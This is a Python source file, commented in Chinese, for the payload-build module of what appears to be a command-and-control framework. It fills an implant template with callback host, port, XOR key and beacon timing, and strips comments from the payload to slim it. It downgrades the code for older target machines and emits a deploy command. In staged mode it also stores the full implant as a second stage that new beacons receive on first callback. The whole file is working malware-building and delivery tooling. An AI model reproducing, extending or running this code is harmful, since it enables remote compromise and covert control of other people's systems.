"""
@module: build
@desc: 生成 implant 分段部署: 默认=第一段(引导) + 自动把完整植入物设为二阶段载荷
(stage_code, 新 beacon 首次回连下发); 传 single=1 生成单段 implant
@params: host port [key_hex] [interval] [jitter] [out_dir] [single]
"""
import json
import os

from server.core.bootstrap import deploy_command
from server.core.config import update_config_file
from server.core.pycode import strip_py_comments, strip_py_docstrings
from server.core.pycompat import downgrade_py35

MODULE = {
    "desc": "默认分段: 第一段引导 + 自动设第二段(首连下发); single=1 出单段",
    "params": [
        ("host", "必填"),
        ("port", "必填"),
        ("key_hex", "可选；缺省自动从 server/config.json 读取 implant_key"),
        ("interval", "默认 60"),
        ("jitter", "默认 0.2;范围 0~0.9(间隔=I×uniform(1-J,1+J),越大越随机)"),
        ("out_dir", "默认 s_modules/output"),
        ("single", "可选；传 1 生成单段 implant(默认分段部署)"),
    ],
}

_SERVER_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_IMPLANT_TEMPLATE = os.path.join(_SERVER_DIR, "implant",
                                 "implant_template.py")
_CONFIG_PATH = os.path.join(_SERVER_DIR, "config.json")
_DEFAULT_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "output")

# 载荷形态(D3, 2026-09-28): **不再做"长名压短名"**——模板源码即产物,
# 只剥注释与 docstring。原因:
#   · 压缩后的单字母短名(f=time/s=sleep_jitter/p=send_frame...)与下发代码里的
#     手写变量名撞车, raw 一句 `with open() as f:` 就把植入物运行时顶掉 → 崩溃;
#   · 长名让模块、假 beacon、文档三端口径一致, 不再需要"别名行"把短名补回长名。
# 体积代价很小: 载荷走 zlib 压缩下发, 实测约 +8%(注释/docstring 去掉后)。
_SINGLE_TRUE = {"1", "true", "yes", "single", "--single"}


def _read_implant_key() -> bytes:
    """从 server/config.json 读取 implant_key（build 自动读取）。"""
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        key = raw.get("implant_key", "")
        if key and len(key) == 64:
            return bytes.fromhex(key)
    except (OSError, ValueError, json.JSONDecodeError):
        pass
    return None


def _clear_stage2(config_path: str = None):
    """清除 config.json 的 stage_code。

    single 单段构建时调用: 此前 staged 构建残留的 stage_code 会继续随
    新 beacon 首连下发(旧完整植入物, 可能旧 host/port/key)——用户明确
    选单段部署就不该再带第二段(2026-09-04 修复)。
    """
    try:
        update_config_file(config_path or _CONFIG_PATH, stage_code="")
    except OSError:
        pass


def _write_stage2(code: str, out_dir: str = None, config_path: str = None):
    """把第二段(完整植入物)写入 config.json 的 stage_code(原子写)。

    只更新 config 不落 output 副本文件(2026-09-04 用户要求: 二阶段载荷
    只需在 config 里更新, 无需 output 文件)。返回 (ok, message)。
    """
    try:
        update_config_file(config_path or _CONFIG_PATH, stage_code=code)
    except OSError as e:
        return False, f"config.json 写入失败: {e}"
    return True, f"config.json(stage_code) 已更新, {len(code)} 字节"


def _resolve_key(key_hex):
    """校验/解析通信密钥; 返回 (bytes, err) 或 (None, message)。"""
    if key_hex:
        try:
            key = bytes.fromhex(key_hex)
        except ValueError:
            return None, "key_hex 不是合法 hex"
        if len(key) != 32:
            return None, (f"key_hex 长度错误（{len(key)} 字节，"
                          f"需要 32 字节 / 64 hex 字符）")
        return key, None
    key = _read_implant_key()
    if key is None:
        return None, ("config.json 无有效 implant_key。"
                      "请先 s_exec keygen，或显式传 key_hex。")
    return key, None


def _validate_params(port, interval, jitter):
    """校验 build 数值参数(抽成纯函数便于单测,2026-09-16)。

    jitter 必须在 0~0.9:间隔 = I × uniform(1-J, 1+J),J>=1 会让下限 <=0
    (0 秒级疯狂回连 + 服务端连接风暴),负数无意义。
    返回 (port, interval, jitter, err);err 非空表示参数非法。
    """
    try:
        port = int(port)
        interval = int(interval)
        jitter = float(jitter)
    except (TypeError, ValueError) as exc:
        return None, None, None, f"参数非法(需数字): {exc}"
    if not (1 <= port <= 65535):
        return None, None, None, f"port 须在 1-65535(收到 {port})"
    if not (1 <= interval <= 86400):
        return None, None, None, f"interval 须在 1-86400 秒(收到 {interval})"
    if not (0.0 <= jitter <= 0.9):
        return None, None, None, (f"jitter 须在 0~0.9(收到 {jitter});"
                                  f"间隔=I×uniform(1-J,1+J),J>=1 会让下限<=0")
    return port, interval, jitter, None


def run(host, port, key_hex=None, interval=60, jitter=0.2, out_dir=None,
        single=None, config_path=None):
    """生成部署载荷并写出文件。

    默认(分段): 第一段=引导(agent_stager), 输出部署命令; 第二段=完整植入物
    自动写入 config.json 的 stage_code——新 beacon 首次回连即下发 exec。
    single 传 '1'/'single' 等 → 保持原单段部署(一条命令内嵌完整植入物)。
    """
    port, interval, jitter, perr = _validate_params(port, interval, jitter)
    if perr:
        return {"status": "error", "message": perr}
    single_mode = single is not None and str(single).strip().lower() in _SINGLE_TRUE

    key, err = _resolve_key(key_hex)
    if err:
        return {"status": "error", "message": err}

    try:
        with open(_IMPLANT_TEMPLATE, "r", encoding="utf-8") as f:
            template = f.read()
    except OSError as e:
        return {"status": "error", "message": f"template read failed: {e}"}

    rendered = template
    rendered = rendered.replace("{{HOST}}", host)
    rendered = rendered.replace("{{PORT}}", str(port))
    rendered = rendered.replace("{{INTERVAL}}", str(interval))
    rendered = rendered.replace("{{JITTER}}", str(jitter))
    rendered = rendered.replace("{{XOR_KEY_BYTES}}", str(list(key)))
    # 下发的载荷零注释、零 docstring(开发笔记留在仓库源码里)
    rendered = strip_py_comments(strip_py_docstrings(rendered))
    rendered = downgrade_py35(rendered)     # 目标机 py3.5: f-string → str.format

    out_dir = out_dir or _DEFAULT_OUT
    os.makedirs(out_dir, exist_ok=True)

    if single_mode:
        # ── 单段: 原行为(一条命令内嵌完整植入物) ──
        command = deploy_command(rendered)
        key_path = os.path.join(out_dir, "xor_key.hex")
        cmd_path = os.path.join(out_dir, "implant_command.txt")
        with open(key_path, "w", encoding="utf-8") as f:
            f.write(key.hex() + "\n")
        with open(cmd_path, "w", encoding="utf-8") as f:
            f.write(command + "\n")
        # 清除 staged 构建残留的第二段(否则新 beacon 首连仍会收到旧
        # stage_code——单段部署不应再带第二段, 2026-09-04 修复)
        _clear_stage2(config_path)
        return {
            "status": "ok",
            "mode": "single",
            "key": key.hex(),
            "files": {"xor_key": key_path, "command": cmd_path},
            "deploy": command,
        }

    # ── 默认分段: 第一段引导(agent_stager) + 第二段自动写入 stage_code ──
    from server.s_modules import agent_stager
    st = agent_stager.run(host, str(port), key_hex, out_dir=out_dir)   # 产物必须跟着 out_dir 走
    if not isinstance(st, dict) or st.get("status") != "ok":
        return {"status": "error",
                "message": f"第一段(引导)生成失败: {st}"}

    ok_w, info = _write_stage2(rendered, config_path=config_path)
    if not ok_w:
        return {"status": "error", "message": f"第二段写入失败: {info}"}

    files = dict(st.get("files") or {})
    return {
        "status": "ok",
        "mode": "staged",
        "key": key.hex(),
        "deploy": st.get("deploy", ""),
        "files": files,
        "stage2": (f"已写入 config.json(stage_code, {len(rendered)} 字节); "
                   f"新 beacon 首次回连即下发。运行中执行 reload 立即生效。"),
    }


if __name__ == "__main__":
    print("usage: s_exec build <host> <port> [key_hex] [interval] [jitter] "
          "[out_dir] [single]")
